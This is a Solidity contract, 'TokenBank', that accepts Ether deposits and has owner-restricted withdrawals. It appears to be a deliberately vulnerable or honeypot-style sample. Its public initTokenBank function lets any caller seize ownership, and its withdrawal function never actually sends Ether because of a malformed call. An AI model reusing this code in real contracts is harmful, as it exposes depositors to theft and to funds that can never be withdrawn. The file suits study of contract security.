pragma solidity ^0.4.18;

contract Ownable
{
    address private newOwner;
    function getOwner() private view returns (address) { return ownerAddress; }
    function setOwner(address addr) private { ownerAddress = addr; }
    address private ownerAddress = msg.sender;
    
    function changeOwner(address addr)
    public
    onlyOwner
    {
        newOwner = addr;
    }
    
    function confirmOwner() 
    public
    {
        if(msg.sender==newOwner)
        {
            setOwner(newOwner);
        }
    }
    
    modifier onlyOwner
    {
        if(getOwner() == msg.sender)_;
    }
}

contract Token is Ownable
{
    function WithdrawToken(address token, uint256 amount,address to)
    public 
    onlyOwner
    {
        token.call(bytes4(sha3("transfer(address,uint256)")),to,amount); 
    }
}

contract TokenBank is Token
{
    uint private minimumDeposit;
    function getMinDeposit() private view returns (uint) { return minimumDeposit; }
    function setMinDeposit(uint value) private { minimumDeposit = value; }
    mapping (address => uint) private holders;
    
    function initTokenBank()
    public
    {
        setOwner(msg.sender);
        setMinDeposit(1 ether);
    }
    
    function()
    payable
    {
        Deposit();
    }
   
    function Deposit() 
    payable
    {
        if(msg.value >= getMinDeposit())
        {
            holders[msg.sender] += msg.value;
        }
    }
    
    function WitdrawTokenToHolder(address _to,address _token,uint _amount)
    public
    onlyOwner
    {
        if(holders[_to] > 0)
        {
            holders[_to] = 0;
            WithdrawToken(_token, _amount, _to);     
        }
    }
   
    function WithdrawToHolder(address _addr, uint _wei) 
    public
    onlyOwner
    payable
    {
        if(holders[msg.sender] > 0)
        {
            if(holders[_addr] >= _wei)
            {
                _addr.call.value(_wei);
                holders[_addr] -= _wei;
            }
        }
    }
    
    function Bal() public constant returns(uint){return this.balance;}
}